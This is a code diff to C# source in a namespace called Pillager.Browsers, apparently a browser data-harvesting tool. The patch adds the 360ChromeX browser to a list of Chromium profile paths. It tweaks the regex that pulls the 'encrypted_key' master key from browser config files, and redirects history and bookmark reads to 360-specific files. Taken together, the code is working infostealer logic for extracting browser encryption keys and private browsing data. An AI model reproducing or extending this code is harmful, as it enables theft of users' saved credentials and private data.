@@ -17,26 +17,27 @@ namespace Pillager.Browsers
 
         public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
         {
-        { "Chrome", "Google\\Chrome\\User Data" } ,
-        { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
-        { "Chromium", "Chromium\\User Data" } ,
-        { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
-        { "Edge", "Microsoft\\Edge\\User Data" } ,
-        { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
-        { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
-        { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
-        { "Vivaldi", "Vivaldi\\User Data" } ,
-        { "CocCoc", "CocCoc\\Browser\\User Data" },
-        { "Torch", "Torch\\User Data" },
-        { "Kometa", "Kometa\\User Data" },
-        { "Orbitum", "Orbitum\\User Data" },
-        { "CentBrowser", "CentBrowser\\User Data" },
-        { "7Star", "7Star\\7Star\\User Data" },
-        { "Sputnik", "Sputnik\\Sputnik\\User Data" },
-        { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
-        { "Uran", "uCozMedia\\Uran\\User Data" },
-        { "Yandex", "Yandex\\YandexBrowser\\User Data" },
-        { "Iridium", "Iridium\\User Data" },
+            { "Chrome", "Google\\Chrome\\User Data" } ,
+            { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
+            { "Chromium", "Chromium\\User Data" } ,
+            { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
+            { "Edge", "Microsoft\\Edge\\User Data" } ,
+            { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
+            { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
+            { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
+            { "360ChromeX", "360ChromeX\\Chrome\\User Data" } ,
+            { "Vivaldi", "Vivaldi\\User Data" } ,
+            { "CocCoc", "CocCoc\\Browser\\User Data" },
+            { "Torch", "Torch\\User Data" },
+            { "Kometa", "Kometa\\User Data" },
+            { "Orbitum", "Orbitum\\User Data" },
+            { "CentBrowser", "CentBrowser\\User Data" },
+            { "7Star", "7Star\\7Star\\User Data" },
+            {"Sputnik", "Sputnik\\Sputnik\\User Data" },
+            { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
+            { "Uran", "uCozMedia\\Uran\\User Data" },
+            { "Yandex", "Yandex\\YandexBrowser\\User Data" },
+            { "Iridium", "Iridium\\User Data" },
         };
 
         private string[] profiles = {
@@ -61,7 +62,7 @@ namespace Pillager.Browsers
             byte[] masterKey = new byte[] { };
             if (!File.Exists(filePath))
                 return null;
-            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
+            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ",""));
             foreach (System.Text.RegularExpressions.Match prof in pattern)
             {
                 if (prof.Success)
@@ -146,7 +147,7 @@ namespace Pillager.Browsers
             StringBuilder history = new StringBuilder();
             foreach (var profile in profiles)
             {
-                string chrome_History_path = Path.Combine(BrowserPath, profile + "\\History");
+                string chrome_History_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360History") : Path.Combine(BrowserPath, profile + "\\History");
                 if (!File.Exists(chrome_History_path))
                     continue;
                 try
@@ -217,7 +218,7 @@ namespace Pillager.Browsers
             StringBuilder stringBuilder = new StringBuilder();
             foreach (var profile in profiles)
             {
-                string chrome_book_path = Path.Combine(BrowserPath, profile + "\\Bookmarks");
+                string chrome_book_path = BrowserName.Contains("360")?Path.Combine(BrowserPath, profile + "\\360Bookmarks"): Path.Combine(BrowserPath, profile + "\\Bookmarks");
                 if (File.Exists(chrome_book_path))
                 {
                     stringBuilder.Append(File.ReadAllText(chrome_book_path));
